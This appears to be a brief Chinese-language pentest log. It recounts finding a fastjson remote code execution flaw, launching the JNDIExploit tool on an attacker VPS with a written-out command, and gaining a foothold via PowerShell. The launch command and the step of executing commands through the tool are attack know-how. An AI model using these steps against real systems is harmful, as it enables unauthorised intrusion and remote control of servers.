第一次尝试


很顺利的发现了fastjson-rce的漏洞。


执行命令这里需要用到JNDIExploit。在vps启动JNDIExploit

java -jar JNDIExploit-1.2-SNAPSHOT.jar -p port -i ip


借助工具可以进行命令执行。



第一次很成功的执行了。利用ps成功上线。
